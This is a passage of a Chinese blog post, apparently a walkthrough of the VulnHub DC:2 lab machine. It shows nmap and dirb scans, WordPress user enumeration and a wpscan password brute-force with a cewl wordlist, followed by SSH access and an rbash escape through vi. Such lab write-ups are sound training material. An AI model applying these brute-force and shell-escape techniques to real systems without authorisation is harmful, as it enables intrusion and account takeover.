@@ -1,0 +1,552 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+  <title>DC：2 - Knight&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Knight's Blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/post.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="DC：2">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2022-06-27 00:00" pubdate>
+        2022年6月27日 凌晨
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      3.6k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      67
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">DC：2</h1>
+            
+            <div class="markdown-body">
+              <h1 id="0x05-DC-2-vulnhub"><a href="#0x05-DC-2-vulnhub" class="headerlink" title="0x05 DC: 2~vulnhub"></a>0x05 DC: 2~vulnhub</h1><blockquote>
+<p>靶机地址：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/dc-2,311/">DC: 2 ~ VulnHub</a></p>
+<p>环境信息：</p>
+<ul>
+<li>攻击机 IP：192.168.135.141</li>
+<li>靶机 IP：192.168.135.148</li>
+</ul>
+</blockquote>
+<h2 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h2><h3 id="1、主机探测"><a href="#1、主机探测" class="headerlink" title="1、主机探测"></a>1、主机探测</h3><p><strong>nmap 命令：</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nmap -sn 192.168.135.0/24</span><br>Starting Nmap 7.91 ( https://nmap.org ) at 2022-06-26 09:23 EDT<br>Nmap scan report for 192.168.135.2<br>Host is up (0.011s latency).<br>Nmap scan report for 192.168.135.141<br>Host is up (0.00018s latency).<br>Nmap scan report for 192.168.135.148<br>Host is up (0.0020s latency).<br>Nmap done: 256 IP addresses (3 hosts up) scanned in 4.62 seconds<br></code></pre></td></tr></table></figure>
+<p><strong>得到靶机 ip：192.168.135.148</strong></p>
+<h3 id="2、端口扫描"><a href="#2、端口扫描" class="headerlink" title="2、端口扫描"></a>2、端口扫描</h3><p><strong>简单的端口扫描：</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sudo nmap -sS -p- 192.168.135.148</span><br>Starting Nmap 7.91 ( https://nmap.org ) at 2022-06-26 09:23 EDT<br>Nmap scan report for 192.168.135.148<br>Host is up (0.0010s latency).<br>Not shown: 65533 closed ports<br>PORT     STATE SERVICE<br>80/tcp   open  http<br>7744/tcp open  raqmon-pdu<br>MAC Address: 00:0C:29:3D:C0:33 (VMware)<br><br>Nmap done: 1 IP address (1 host up) scanned in 4.23 seconds<br></code></pre></td></tr></table></figure>
+<p><strong>全面扫描：</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nmap -A -p- 192.168.135.148</span><br>Starting Nmap 7.91 ( https://nmap.org ) at 2022-06-26 09:27 EDT<br>Nmap scan report for 192.168.135.148<br>Host is up (0.0015s latency).<br>Not shown: 65533 closed ports<br>PORT     STATE SERVICE VERSION<br>80/tcp   open  http    Apache httpd 2.4.10 ((Debian))<br>|_http-server-header: Apache/2.4.10 (Debian)<br>|_http-title: Did not follow redirect to http://dc-2/<br>7744/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)<br>| ssh-hostkey: <br>|   1024 52:51:7b:6e:70:a4:33:7a:d2:4b:e1:0b:5a:0f:9e:d7 (DSA)<br>|   2048 59:11:d8:af:38:51:8f:41:a7:44:b3:28:03:80:99:42 (RSA)<br>|   256 df:18:1d:74:26:ce:c1:4f:6f:2f:c1:26:54:31:51:91 (ECDSA)<br>|_  256 d9:38:5f:99:7c:0d:64:7e:1d:46:f6:e9:7c:c6:37:17 (ED25519)<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap done: 1 IP address (1 host up) scanned in 16.16 seconds<br></code></pre></td></tr></table></figure>
+<p><strong>得到目标端口信息：</strong></p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>PORT</th>
+<th>STATE</th>
+<th>SERVICE</th>
+<th>VERSION</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>80/tcp</td>
+<td>open</td>
+<td>http</td>
+<td>Apache httpd 2.4.10 ((Debian))</td>
+</tr>
+<tr>
+<td>7744/tcp</td>
+<td>open</td>
+<td>ssh</td>
+<td>OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h3 id="3、端口探测"><a href="#3、端口探测" class="headerlink" title="3、端口探测"></a>3、端口探测</h3><p><strong>7744端口</strong></p>
+<p>暂时未得到 username 和 password 的相关信息，无法使用 ssh</p>
+<p><strong>80端口</strong></p>
+<p>访问 <code>http://192.168.135.148</code> ，发现无法访问且重定向到了 <code>http://dc-2/</code> ，这样的话我们添加一条映射：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> cat /etc/hosts</span>                                                                                             <br>127.0.0.1       localhost<br>127.0.1.1       kali<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> The following lines are desirable <span class="hljs-keyword">for</span> IPv6 capable hosts</span><br>::1     localhost ip6-localhost ip6-loopback<br>ff02::1 ip6-allnodes<br>ff02::2 ip6-allrouters<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> sudo vi /etc/hosts</span>   <br><span class="hljs-meta">#</span><span class="bash"> 添加: 192.168.135.148 dc-2</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> cat /etc/hosts</span>          <br>127.0.0.1       localhost<br>127.0.1.1       kali<br>192.168.135.148 dc-2<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> The following lines are desirable <span class="hljs-keyword">for</span> IPv6 capable hosts</span><br>::1     localhost ip6-localhost ip6-loopback<br>ff02::1 ip6-allnodes<br>ff02::2 ip6-allrouters<br></code></pre></td></tr></table></figure>
+<p>这样就可以正常访问了。</p>
+<p>进行目录爆破：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> dirb http://dc-2</span>                                                    <br><br>-----------------<br>DIRB v2.22    <br>By The Dark Raver<br>-----------------<br><br>START_TIME: Sun Jun 26 21:05:39 2022<br>URL_BASE: http://dc-2/<br>WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt<br><br>-----------------<br><br>GENERATED WORDS: 4612                                                          <br><br>---- Scanning URL: http://dc-2/ ----<br>+ http://dc-2/index.php (CODE:301|SIZE:0)<br>+ http://dc-2/server-status (CODE:403|SIZE:292)<br>==&gt; DIRECTORY: http://dc-2/wp-admin/<br>==&gt; DIRECTORY: http://dc-2/wp-content/<br>==&gt; DIRECTORY: http://dc-2/wp-includes/<br>+ http://dc-2/xmlrpc.php (CODE:405|SIZE:42)<br><br>---- Entering directory: http://dc-2/wp-admin/ ----<br>+ http://dc-2/wp-admin/admin.php (CODE:302|SIZE:0)<br>==&gt; DIRECTORY: http://dc-2/wp-admin/css/<br>==&gt; DIRECTORY: http://dc-2/wp-admin/images/<br>==&gt; DIRECTORY: http://dc-2/wp-admin/includes/<br>+ http://dc-2/wp-admin/index.php (CODE:302|SIZE:0)<br>==&gt; DIRECTORY: http://dc-2/wp-admin/js/<br>==&gt; DIRECTORY: http://dc-2/wp-admin/maint/<br>==&gt; DIRECTORY: http://dc-2/wp-admin/network/<br>==&gt; DIRECTORY: http://dc-2/wp-admin/user/<br><br>---- Entering directory: http://dc-2/wp-content/ ----<br>+ http://dc-2/wp-content/index.php (CODE:200|SIZE:0)<br>==&gt; DIRECTORY: http://dc-2/wp-content/languages/<br>==&gt; DIRECTORY: http://dc-2/wp-content/plugins/<br>==&gt; DIRECTORY: http://dc-2/wp-content/themes/<br><br>---- Entering directory: http://dc-2/wp-admin/network/ ----<br>+ http://dc-2/wp-admin/network/admin.php (CODE:302|SIZE:0)<br>+ http://dc-2/wp-admin/network/index.php (CODE:302|SIZE:0)<br><br>---- Entering directory: http://dc-2/wp-admin/user/ ----<br>+ http://dc-2/wp-admin/user/admin.php (CODE:302|SIZE:0)<br>+ http://dc-2/wp-admin/user/index.php (CODE:302|SIZE:0)<br><br>---- Entering directory: http://dc-2/wp-content/plugins/ ----<br>+ http://dc-2/wp-content/plugins/index.php (CODE:200|SIZE:0)<br><br>---- Entering directory: http://dc-2/wp-content/themes/ ----<br>+ http://dc-2/wp-content/themes/index.php (CODE:200|SIZE:0)<br><br>-----------------<br>END_TIME: Sun Jun 26 21:06:32 2022<br>DOWNLOADED: 32284 - FOUND: 12<br></code></pre></td></tr></table></figure>
+<h2 id="二、权限获取"><a href="#二、权限获取" class="headerlink" title="二、权限获取"></a>二、权限获取</h2><p>访问 <code>http://dc-2</code> ，得到一些提示：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> http://dc-2</span><br>DC-2<br>Just another WordPress site<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> http://dc-2/index.php/flag/</span><br>Flag 1:<br>Your usual wordlists probably won’t work, so instead, maybe you just need to be cewl.<br>More passwords is always better, but sometimes you just can’t win them all.<br>Log in as one to see the next flag.<br>If you can’t find it, log in as another.<br></code></pre></td></tr></table></figure>
+<p>扫描 WordPress 用户：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> wpscan --url http://dc-2 --enumerate u</span>  <br>[+] URL: http://dc-2/ [192.168.135.148]<br>[+] Started: Sun Jun 26 21:26:57 2022<br><br>Interesting Finding(s):<br><br>[+] Headers<br> | Interesting Entry: Server: Apache/2.4.10 (Debian)<br> | Found By: Headers (Passive Detection)<br> | Confidence: 100%<br><br>[+] XML-RPC seems to be enabled: http://dc-2/xmlrpc.php<br> | Found By: Direct Access (Aggressive Detection)<br> | Confidence: 100%<br> | References:<br> |  - http://codex.wordpress.org/XML-RPC_Pingback_API<br> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/<br> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/<br> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/<br> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/<br><br>[+] WordPress readme found: http://dc-2/readme.html<br> | Found By: Direct Access (Aggressive Detection)<br> | Confidence: 100%<br><br>[+] The external WP-Cron seems to be enabled: http://dc-2/wp-cron.php<br> | Found By: Direct Access (Aggressive Detection)<br> | Confidence: 60%<br> | References:<br> |  - https://www.iplocation.net/defend-wordpress-from-ddos<br> |  - https://github.com/wpscanteam/wpscan/issues/1299<br><br>[+] WordPress version 4.7.10 identified (Insecure, released on 2018-04-03).<br> | Found By: Rss Generator (Passive Detection)<br> |  - http://dc-2/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=4.7.10&lt;/generator&gt;<br> |  - http://dc-2/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=4.7.10&lt;/generator&gt;<br><br>[+] WordPress theme in use: twentyseventeen<br> | Location: http://dc-2/wp-content/themes/twentyseventeen/<br> | Last Updated: 2022-05-24T00:00:00.000Z<br> | Readme: http://dc-2/wp-content/themes/twentyseventeen/README.txt<br> | [!] The version is out of date, the latest version is 3.0<br> | Style URL: http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10<br> | Style Name: Twenty Seventeen<br> | Style URI: https://wordpress.org/themes/twentyseventeen/<br> | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...<br> | Author: the WordPress team<br> | Author URI: https://wordpress.org/<br> |<br> | Found By: Css Style In Homepage (Passive Detection)<br> |<br> | Version: 1.2 (80% confidence)<br> | Found By: Style (Passive Detection)<br> |  - http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10, Match: &#x27;Version: 1.2&#x27;<br><br>[+] Enumerating Users (via Passive and Aggressive Methods)<br> Brute Forcing Author IDs - Time: 00:00:01 &lt;=========================================================================&gt; (10 / 10) 100.00% Time: 00:00:01<br><br>[i] User(s) Identified:<br><br>[+] admin<br> | Found By: Rss Generator (Passive Detection)<br> | Confirmed By:<br> |  Wp Json Api (Aggressive Detection)<br> |   - http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1<br> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br> |  Login Error Messages (Aggressive Detection)<br><br>[+] jerry<br> | Found By: Wp Json Api (Aggressive Detection)<br> |  - http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1<br> | Confirmed By:<br> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br> |  Login Error Messages (Aggressive Detection)<br><br>[+] tom<br> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br> | Confirmed By: Login Error Messages (Aggressive Detection)<br><br>[!] No WPScan API Token given, as a result vulnerability data has not been output.<br>[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register<br></code></pre></td></tr></table></figure>
+<p>使用 cewl 对站点生成字典：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> cewl http://dc-2 -w passwd.txt</span><br>CeWL 5.5.2 (Grouping) Robin Wood (robin@digi.ninja) (https://digi.ninja/)<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;admin\njerry\ntom&quot;</span> &gt; user.txt</span> <br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> cat user.txt</span>                  <br>admin<br>jerry<br>tom<br></code></pre></td></tr></table></figure>
+<p>使用 wpscan 进行爆破：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> wpscan --url http://dc-2 -U user.txt -P passwd.txt</span><br>[+] URL: http://dc-2/ [192.168.135.148]<br>[+] Performing password attack on Xmlrpc against 3 user/s<br>[SUCCESS] - jerry / adipiscing<br>[SUCCESS] - tom / parturient<br>Trying admin / log Time: 00:01:59 &lt;=============&gt; (646 / 1121) 57.62%  ETA: ??:??:??<br><br>[!] Valid Combinations Found:<br> | Username: jerry, Password: adipiscing<br> | Username: tom, Password: parturient<br></code></pre></td></tr></table></figure>
+<p>通过查找得到登录页面：<code>http://dc-2/wp-admin ===&gt; http://dc-2/wp-login.php</code> 。</p>
+<p>使用 <code>Username: jerry, Password: adipiscing</code> 登录，在 <code>Pages</code> 中发现 <code>flag2</code> ：</p>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ada">Flag <span class="hljs-number">2</span>:<br><span class="hljs-keyword">If</span> you can<span class="hljs-symbol">&#x27;t</span> exploit WordPress <span class="hljs-keyword">and</span> take a shortcut, there <span class="hljs-keyword">is</span> another way.<br>Hope you found another <span class="hljs-keyword">entry</span> point.<br></code></pre></td></tr></table></figure>
+<p>使用得到的用户和密码 <code>Username: tom, Password: parturient</code> 尝试 SSH 登录：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ssh tom@192.168.135.148 -p 7744</span><br>tom@192.168.135.148&#x27;s password: <br>......<br>Last login: Sun Jun 26 19:25:52 2022 from 192.168.135.141<br>tom@DC-2:~$ ls<br>flag3.txt  usr<br>tom@DC-2:~$ cat flag3.txt<br>-rbash: cat: command not found<br>tom@DC-2:~$ ls usr/bin<br>less ls scp vi<br>tom@DC-2:~$ vi flag3.txt<br><span class="hljs-meta">#</span><span class="bash"> Poor old Tom is always running after Jerry. Perhaps he should su <span class="hljs-keyword">for</span> all the stress he causes.</span><br></code></pre></td></tr></table></figure>
+<p>得到 flag3，根据提示进行进一步提权。</p>
+<h2 id="三、权限提升"><a href="#三、权限提升" class="headerlink" title="三、权限提升"></a>三、权限提升</h2><h3 id="1、绕-rbash"><a href="#1、绕-rbash" class="headerlink" title="1、绕 rbash"></a>1、绕 rbash</h3><blockquote>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7642#toc-0">rbash逃逸大全 - 先知社区 (aliyun.com)</a></p>
+</blockquote>
+<p>发现 tom 使用 rbash，shell 被限制了，功能特别少，很多命令无法使用，所以要绕过 rbash 。</p>
+<blockquote>
+<p>restricted shell 是一种只能使用部分命令的 shell ；它为 Linux 中的 shell 提供了一个额外的安全层</p>
+<p>rbash（The restricted mode of bash）为限制型 bash；是 restricted shell 的一种（rbash、ksh、rsh等）</p>
+</blockquote>
+<p><strong>方法一：通过 vi 提升 Shell 权限</strong>：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> vi</span><br><span class="hljs-meta">#</span><span class="bash"> 进入底行模式</span><br><span class="hljs-meta">#</span><span class="bash"> <span class="hljs-built_in">set</span> shell=/bin/sh</span><br><span class="hljs-meta">#</span><span class="bash"> shell</span><br><span class="hljs-meta">#</span><span class="bash"> <span class="hljs-built_in">export</span> PATH=<span class="hljs-variable">$PATH</span>:/bin/</span><br><br>tom@DC-2:~$ vi<br><span class="hljs-meta">#</span><span class="bash"> :<span class="hljs-built_in">set</span> shell=/bin/bash    回车</span><br><span class="hljs-meta">#</span><span class="bash"> :shell    回车</span><br><br>tom@DC-2:~$ export PATH=$PATH:/bin/<br>tom@DC-2:~$ cat flag3.txt<br>Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.<br></code></pre></td></tr></table></figure>
+<p><strong>方法二：通过 BASH_CMDS 提升 Shell 权限</strong>：</p>
